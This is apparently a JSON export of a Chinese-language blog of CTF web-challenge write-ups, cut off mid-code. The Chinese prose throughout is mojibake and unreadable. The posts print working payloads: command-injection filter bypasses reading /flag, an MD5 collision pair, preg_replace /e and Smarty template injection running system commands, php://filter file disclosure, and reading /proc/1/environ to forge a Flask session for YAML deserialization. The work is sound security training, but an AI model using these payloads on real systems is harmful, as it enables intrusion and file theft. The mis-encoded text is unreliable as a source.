postæ–¹å¼ä¼ aä¸b è¦æ±‚aä¸bä¸ç›¸ç­‰ ä½†æ˜¯md5åŠ å¯†åç›¸ç­‰\n\nå…ˆæ¥çœ‹æ­£åˆ™åŒ¹é…\n\næ²³èŸ¹äº†ä¸€äº›å¸¸ç”¨çš„linuxå‘½ä»¤å’Œä¸€äº›å­—ç¬¦  è¿™é‡Œé‡ç‚¹æ¥çœ‹ä¸€ä¸‹åæ–œæ çš„å±è”½ å…¶å®è¿™é“é¢˜è¿™é‡ŒåŒ¹é…åæ–œæ å‡ºç°é—®é¢˜äº†\n\næœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856125949-61736d5d-4b4e-4f84-839e-df9dfa4ed823.png)`|\\\\|\\\\\\\\|` è¿™é‡Œä¸¤ä¸ªåæ–œæ çš„ç¬¬äºŒä¸ªåæ–œæ è½¬ä¹‰äº†ç¬¬äºŒä¸ª`|` ä½¿å¾—è¿™ä¸€å—å‡ºç°äº†é”™è¯¯\n\næœ€ç»ˆè¿™é‡Œå°±æ˜¯åŒ¹é… `\\|\\\\\\\\`è¿™ä¸€å— å› æ­¤å¯ä»¥ç”¨åæ–œæ \n\næœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$cmd=\"\\|\\\\\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856091671-e7091ec9-b81a-4757-9431-b32fc21a3a06.png)\n\nä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åŒ¹é…ä¸€ä¸ª`\\` é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¼–å†™æ­£åˆ™çš„æ—¶å€™å°±éœ€è¦`\\\\\\`æ¥è¾¾åˆ°åŒ¹é…ä¸€ä¸ª`\\`çš„æ•ˆæœ\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856165041-ec8b1553-a9ed-4c29-8092-e50c61727e41.png)\n\næ¥ç€æ¥çœ‹ç¬¬äºŒéƒ¨åˆ†md5å¼ºç›¸ç­‰\n\nä¸€å¼€å§‹æˆ‘æ˜¯æƒ³é€šè¿‡æ•°ç»„æ–¹å¼ç»•è¿‡ ä½†æ˜¯è¿™é“é¢˜åœ¨post aå’Œbå€¼åå¯¹ä»–ä»¬è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ å› æ­¤ä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡äº†\n\nåªèƒ½ç”¨ä¸€ä¸ªè„šæœ¬è¿›è¡Œmd5ç¢°æ’ ä½¿å¾—ä¸¤ä¸ªå­—ç¬¦çš„md5å€¼å¼ºç›¸ç­‰\n\nåªèƒ½å€ŸåŠ©fastcollè¿™ä¸ªå·¥å…· å…·ä½“å‚è€ƒï¼š[https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167785642816800213071097%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187](https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%7B%22request%5Fid%22%3A%22167785642816800213071097%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187) è¿™ç¯‡æ–‡ç« \n\næ³¨æ„æœ€åç”Ÿæˆçš„ç»“æœæ˜¯é€šè¿‡urlç¼–ç åçš„ å¦‚æœä¸è¿›è¡Œurlç¼–ç  é‚£ä¹ˆç»“æœä¼šå‡ºç°ä¹±ç  æœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$a = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0\";\n$b = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0\";\necho urldecode($a);\necho \"\\n\";\necho urldecode($b);\necho \"\\n\";\necho \"--------------------------------------------------\";\necho \"\\n\";\nif(md5(urldecode($a))===md5(urldecode($b))){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856630211-e345d088-4b18-477d-b771-d38e62a64410.png)\n\nå› ä¸ºæˆ‘ä»¬æäº¤çš„å†…å®¹ä¼šè¢«æµè§ˆå™¨é»˜è®¤urlè§£ç ä¸€æ¬¡ æ‰€ä»¥ç»“æœéƒ½æ˜¯ä¸€æ ·çš„\n\nä½†æ˜¯æˆ‘ä»¬æŸ¥è¯»æ–‡ä»¶æ‰€éœ€çš„ `ls cat`éƒ½è¢«æ­£åˆ™åŒ¹é…äº†è¿™é‡Œåº”è¯¥æ€ä¹ˆç»•è¿‡å‘¢\n\nç¬¬ä¸€ç§æ–¹å¼ï¼š\n\nå¯ä»¥ç”¨`dir`æ¥ä»£æ›¿`ls` è¿›è¡Œæµè§ˆæ–‡ä»¶\n\nä½œç”¨å’Œ`ls`ä¸€æ ·\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857170069-3d416306-3483-485a-8c98-90b3fa7d5970.png)\n\n`sort`ä»£æ›¿`cat`è¿›è¡Œè¯»æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857270604-b9b7b79c-de53-4bd1-a023-fcc8b44a3134.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857752295-1bffe6b1-fa37-47d1-86ec-954c63aef05f.png)\n\næ³¨æ„è¿™é‡ŒæŠ“åŒ…payloadçš„æ—¶å€™è¦å°†æäº¤æ–¹å¼æ”¹ä¸ºpost ç¬¬ä¸€æ¬¡åšä¸€ç›´éƒ½æ˜¯getä¼ å‚ä¸€ç›´æ²¡åšå‡ºæ¥ ä¹‹åæ‰å‘ç°è¦å°†bpçš„ä¼ å‚æ–¹å¼æ”¹ä¸ºpost ç©ºæ ¼ç”¨urlç¼–ç æ–¹å¼`%20`ç»†èŠ‚å¾ˆé‡è¦\n\næ„é€ payloadï¼š`?cmd=dir%20/`\n\npost:`a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857467024-2f3e1f70-d3ea-4a45-be27-295350e349e9.png)\n\næ„é€ payloadï¼š`?cmd=sort%20/flag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857524959-3e9deaf5-07fe-4452-bb95-4a93d916f4fd.png)\n\nç¬¬äºŒç§æ–¹å¼ ä¹‹å‰è¯´æ­£åˆ™åŒ¹é…æ²¡æœ‰è¿‡æ»¤åæ–œæ \n\nåæ–œæ åœ¨linuxå‘½ä»¤ä¸­ä¹Ÿæ˜¯èµ·ç€è½¬ä¹‰çš„æ„ä¹‰ é‚£ä¹ˆåœ¨å­—æ¯å‰åŠ `\\`å°±ç­‰äºæ²¡åŠ  `\\n`è¿™ç§ç‰¹æ®Šæƒ…å†µé™¤å¤–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857770921-1b917b10-6346-4376-85f9-ee34ce0e440f.png)\n\né‚£ä¹ˆå°±å¯ä»¥åœ¨å‘½ä»¤ä¸­æ·»åŠ åæ–œæ è¿›è¡Œç»•è¿‡æ­£åˆ™åŒ¹é…\n\næ„é€ payload:`?cmd=l\\s%20/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857842519-a139ce6f-740f-4d26-9491-5b54072c5a5c.png)\n\nå†æ„é€ ï¼š`?cmd=ca\\t%20/flag`\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857890453-7b478239-0e35-4be4-849a-e51c406b7fc6.png)\n","tags":["bypass","md5å¼ºç›¸ç­‰ç¢°æ’"],"categories":["buuctf"]},{"title":"buuctf-40-[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤","url":"/post/ed5a1437.html","content":"\n[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤\n\n<!--more-->\n\nå…ˆæ˜¯ä¸€ä¸ªä»£ç å®¡è®¡å’Œä¹‹å‰ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®å¾ˆåƒï¼Œå°±æ˜¯ä¸€ä¸ªä¼ªåè®®çš„åˆ©ç”¨ \n\næ„é€ payloadï¼š\n\n```\n?text=data:text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php\n```\n\nå¾—åˆ°æºç ï¼š\n\n```php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n```\n\nç„¶åè¿™é‡Œæ¶‰åŠåˆ°preg_replace() /eæ¨¡å¼çš„æ¼æ´ å°†ç”¨äºæ›¿æ¢çš„éƒ¨åˆ†å½“ä½œphpä»£ç æ‰§è¡Œ å‚è€ƒï¼šhttps://xz.aliyun.com/t/2557\n\nè¿™é‡Œ`\\\\1` å…¶å®å°±æ˜¯ `\\1` ç¬¬ä¸€ä¸ª `\\ `ç”¨äºè½¬ä¹‰äº† é‚£ä¹ˆç»“æœå°±æ˜¯`\\1` åœ¨è¿™é‡Œæ˜¯åå‘å¼•ç”¨ ç”±äºæˆ‘è¿™é‡Œæ²¡æå¤ªæ˜ç™½ \n\nè¿™ç±»é¢˜ç›´æ¥ç”¨æ¨¡æ¿ç­”æ¡ˆå°±è¡Œ`\\S*=${å‘½ä»¤æ‰§è¡Œ}` å¤§ä½¬æ€»ç»“çš„å¾ˆå…¨ \n\næ€è·¯å°±æ˜¯è°ƒç”¨getFlag()å‡½æ•° ç„¶åcmd= å‘½ä»¤æ‰§è¡Œ\n\n`/next.php?\\S*=${getFlag()}&cmd=system('cat /flag');` æ³¨æ„æ˜¯åœ¨next.php ä¸‹æäº¤getä¼ å‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250464663-0534828a-c656-49be-a906-3aaaf89394b0.png)\n\nè¿™é‡Œforeachæ­é…`$_GET`æœ‰ç‰¹æ®Šçš„ç”¨æ³• æ³¨æ„è¿™é‡Œä¸æ˜¯`$_GET[]`\n\næœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒæµ‹è¯•äº†ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250349098-0aa84b36-823c-4a2d-91d8-c76fcbe35c26.png)\n\nç®€å•è¯´å°±æ˜¯å½¢å¦‚a=bçš„å½¢å¼å˜é‡åå’Œå€¼åˆ†æˆä¸¤ä¸ªå˜é‡æ¥ä½¿ç”¨ è›®ç¥å¥‡çš„\n","tags":["preg_replace() /e"],"categories":["buuctf"]},{"title":"buuctf 39-[BSidesCF 2020]Had a bad day","url":"/post/78a48903.html","content":"\n[BSidesCF 2020]Had a bad day\n\n<!--more-->\n\næ‰“å¼€æŠ“åŒ…æ²¡æœ‰å‘ç°ä»€ä¹ˆå¼‚å¸¸çš„ä¸œè¥¿ï¼Œä½†æ˜¯ç½‘ç«™è·å–æ–°é¡µé¢æ–¹å¼æœ‰ç‚¹å¥‡æ€ªï¼Œé€šè¿‡getä¼ å‚å–å€¼æ¥è·å–æ–°å†…å®¹ï¼Œå°±è”æƒ³åˆ°äº†ä¼ªåè®®ã€‚\n\nç›´æ¥è¯•è¯•flag.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214256490-6f408795-207e-463c-bc26-534bf543cfd9.png)\n\nä¸è¡Œå‘¢å°±è¯•è¯•index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214298541-98bada9c-dcc0-487c-ba35-bdcb23d1b86e.png)\n\nå‘ç°åå°ä¸»åŠ¨ç»™æˆ‘ä»¬åŠ äº†.phpåç¼€ \n\næ„é€ payloadï¼š`?category=php://filter/read=convert.base64-encode/resource=index`\n\nè·å¾—base64ç è§£ç å¾—å‡ºæºç ï¼š\n\n```plain\n                  <?php\n    \t\t\t\t$file = $_GET['category'];\n    \n    \t\t\t\tif(isset($file))\n    \t\t\t\t{\n    \t\t\t\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n    \t\t\t\t\t\tinclude ($file . '.php');\n    \t\t\t\t\t}\n    \t\t\t\t\telse{\n    \t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n    \t\t\t\t\t}\n    \t\t\t\t}\n    \t\t\t\t?>\n```\n\næˆ‘ä»¬åªèƒ½è¯»å–ä»–è§„å®šçš„`woofers` `meowers` `index` ä¸‰ä¸ªæ–‡ä»¶\n\nçœ‹äº†åˆ«äººçš„wp åˆå­¦åˆ°äº†æ–°å§¿åŠ¿ ä¼ªåè®®é‡Œé¢è¿˜å¯ä»¥å†åµŒå¥—ä¸€å±‚åè®® åŠ ä¸Šä»–ç»™çš„åˆæ³•æ–‡ä»¶\n\n```\n?category=php://filter/read=convert.base64-encode/index/resource=flag\n```\n\n`?category=php://filter/read=convert.base64-encode/resource=index/../flag` ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ å­¦åˆ°äº†\n","tags":["phpä¼ªåè®®"],"categories":["buuctf"]},{"title":"HDCTF 2023(çœå†…èµ›é“)","url":"/post/dd40690e.html","content":"\nHDCTF 2023(çœå†…èµ›é“) éƒ¨åˆ†WP\n\n<!--more-->\n\næœ€ç»ˆæ’åç¬¬ä¸ƒå§ webç‹—è¡¨ç¤ºwebåé¢å‡ é“çœŸçš„å¾ˆéš¾,ç›®å‰åˆ·é¢˜è¿˜æ²¡æœ‰åšåˆ°åå‡ é“é¢˜ç›®çš„ç±»å‹ï¼Œæ‰€ä»¥ååŠé˜¶æ®µçœŸçš„åœ¨åç‰¢ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼ŒåŠªåŠ›ï¼ï¼ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png)\n\n# Web\n\n## Welcome To HDCTF 2023\n\n### è§£ä¸€ï¼š\n\nç›´æ¥é€æ­»\n\n### è§£äºŒï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png)\n\nç›´æ¥è¾“å…¥åœ¨consoleä¸­è¾“å…¥seeeeeeeecretå°±èƒ½æ‹¿åˆ°\n\n## SearchMaster\n\nè¿™é¢˜æ‹¿äº†ä¸€è¡€ å¼€å¿ƒqwq\n\nä¸€çœ¼ä¸çœŸ phpçš„smartyæ³¨å…¥\n\næ„é€ payloadï¼š\n\n```\ndata={if system('ls /')}{/if}\ndata={if system('cat /flag_13_searchmaster')}{/if}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png)\n\n# Crypto\n\n## Normal_Rsa\n\nåº”è¯¥æ˜¯é¢˜ç›®å‡ºé—®é¢˜äº† æ‰“å¼€é¢˜ç›®flagå°±æœ‰\n\n# Misc\n\n## hardMisc\n\nä¹Ÿæ˜¯æ‹¿åˆ°ä¸€ä¸ªä¸€è¡€\n\næ‹–è¿›010ä¸€æŠŠæ¢­\n\næœ«å°¾ base64è§£ç æ‹¿åˆ°flag\n\n\n\n# å¤ç°ï¼š\n\n## YamiYami\n\nä¸€é“å…³äºsessionä¼ªé€  yaml(ä¸€å¼€å§‹ä¸€ç›´åœ¨æœyamiååºåˆ—åŒ– è¿˜åœ¨æƒ³ä¸ºä»€ä¹ˆæœä¸åˆ°ç›¸å…³æ–‡ç«  çœŸè¯¥æ­»å•Šæˆ‘)ååºåˆ—åŒ– shellåå¼¹çš„é¢˜ç›®\n\nå€ŸåŠ©è¿™é“é¢˜ç›®å¥½å¥½å­¦ä¹ ä¸€ä¸‹yamiæ¼æ´å’Œshellåå¼¹\n\nè¿›å…¥é¢˜ç›®åèƒ½çœ‹åˆ°æœ‰ä¸‰ä¸ªè·¯ç”± `/read`æ˜¯ç”¨æ¥è¯»æ–‡ä»¶çš„ `/upload`æ˜¯ç”¨æ¥ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„ä»£ç æ–‡ä»¶çš„ `/pwd `å­—é¢æ„æ€å°±æ˜¯å‘Šè¯‰æˆ‘ä»¬å½“å‰åœ¨å“ªä¸ªæ–‡æ¡£ä¸­\n\nå½“æ—¶åšé¢˜çš„æ—¶å€™è¿˜ä»¥ä¸ºè¿™é“é¢˜ç›®éš¾åº¦åº”è¯¥ä¸ä¼šå¾ˆéš¾ è¿˜ä»¥ä¸ºæ˜¯å¾ˆåŸºç¡€çš„ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å»åŒ…å«ç„¶ågetshell çœ‹äº†wpçœŸçš„æ€€ç–‘äººç”Ÿ\n\n### éé¢„æœŸ\n\nå…ˆè¯´è¯´éé¢„æœŸå§ ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡å°±å¯ä»¥äº† æˆ‘å½“æ—¶ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„ ä½†æ˜¯æˆ‘çº¯è„‘ç˜«å»è¯»linuxç³»ç»Ÿç”¨æˆ·ç¯å¢ƒä¿¡æ¯äº†\n\nè€Œä¸”é¢˜ç›®ç¯å¢ƒåº”è¯¥æ˜¯åœ¨dockerä¸‹\n\nä¸€å¼€å§‹ä¸€ç›´åœ¨è¯»`/etc/profile`\n\n **/etc/profileï¼š** æ­¤æ–‡ä»¶ä¸ºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·è®¾ç½®ç¯å¢ƒä¿¡æ¯,å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•æ—¶,è¯¥æ–‡ä»¶è¢«æ‰§è¡Œ. å¹¶ä»/etc/profile.dç›®å½•çš„é…ç½®æ–‡ä»¶ä¸­æœé›†shellçš„è®¾ç½®ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png)\n\næ ¹æœ¬æ²¡ä»€ä¹ˆç”¨\n\nåº”è¯¥è¯»ç¯å¢ƒå˜é‡`/proc/1/environ`ï¼ˆè¯¦ç»†å¯å‚è€ƒï¼šhttps://blog.csdn.net/FY_2018/article/details/112986445ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png)\n\n### é¢„æœŸï¼š\n\nä¸Šä¼ ä¸€ä¸ªyamiååºåˆ—åŒ–æ–‡ä»¶ ç„¶ååå¼¹shellå»æ‰“\n\né¦–å…ˆå…ˆå»è¯»æºæ–‡ä»¶ å‘ç°åšflaskçš„é¢˜ç›® èƒ½getåˆ°æºä»£ç å°±å»åŠªåŠ›ï¼\n\nè¿™é‡Œç”¨åˆ°äº†python3è§£æç‰¹æ€§\n\nå¦‚æœç›´æ¥æ„é€ payload`/read?url=file:///app.py` flagå­—æ ·ä¹Ÿè¢«æ­£åˆ™äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png)\n\n\n\nå‘ç°æ˜¯ä¸è¡Œçš„ è¢«è¿‡æ»¤äº†\n\nè¿™é‡Œç”¨åˆ°äº†python3çš„å­—ç¬¦è§£æç‰¹æ€§é€šè¿‡åŒé‡urlç¼–ç ï¼ˆå…¨å­—ç¬¦ï¼‰å»ç»•è¿‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png)\n\næ‹¿åˆ°æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png)\n\n\n\næºç ï¼š\n\n```cmake\n#encoding:utf-8\nimport os\nimport re, random, uuid\nfrom flask import *\nfrom werkzeug.utils import *\nimport yaml\nfrom urllib.request import urlopen\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = False\nBLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"]\napp.config['UPLOAD_FOLDER']=\"/app/uploads\"\n\n@app.route('/')\ndef index():\n    session['passport'] = 'YamiYami'\n    return '''\n    Welcome to HDCTF2023 <a href=\"/read?url=https://baidu.com\">Read somethings</a>\n    <br>\n    Here is the challenge <a href=\"/upload\">Upload file</a>\n    <br>\n    Enjoy it <a href=\"/pwd\">pwd</a>\n    '''\n@app.route('/pwd')\ndef pwd():\n    return str(pwdpath)\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('app.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m:\n            return \"re.findall('app.*', url, re.IGNORECASE)\"\n        if n:\n            return \"re.findall('flag', url, re.IGNORECASE)\"\n        res = urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print(str(ex))\n    return 'no response'\n\ndef allowed_file(filename):\n   for blackstr in BLACK_LIST:\n       if blackstr in filename:\n           return False\n   return True\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            return \"Empty file\"\n        if file and allowed_file(file.filename):\n            filename = secure_filename(file.filename)\n            if not os.path.exists('./uploads/'):\n                os.makedirs('./uploads/')\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            return \"upload successfully!\"\n    return render_template(\"index.html\")\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\nif __name__=='__main__':\n    pwdpath = os.popen(\"pwd\").read()\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\nå‘ç°è¿˜æœ‰ä¸€ä¸ª`/boogipop`è·¯ç”±\n\n```cmake\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\n```\n\nå½“`session=\"Welcome To HDCTF2023\"`é€šè¿‡getæ–¹å¼å»è¯»æ–‡ä»¶ ä¹Ÿå°±æ˜¯è¯´è¿˜éœ€è¦sessionä¼ªé€  \n\nä¼ªé€ éœ€è¦key é‚£ä¹ˆçœ‹æºç æ˜¯æ€ä¹ˆç”Ÿæˆçš„\n\n```cmake\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\n```\n\nåœ¨ python ä¸­ä½¿ç”¨ uuid æ¨¡å—ç”Ÿæˆ UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ uuid.getnode() æ–¹æ³•æ¥è·å–è®¡ç®—æœºçš„ç¡¬ä»¶åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸º UUID çš„ä¸€éƒ¨åˆ†ã€‚  \n\n`/sys/class/net/eth0/address`ï¼Œè¿™ä¸ªå°±æ˜¯ç½‘å¡çš„ä½ç½®ï¼Œè¯»å–ä»–è¿›è¡Œä¼ªé€   \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png)\n\n```cmake\nimport 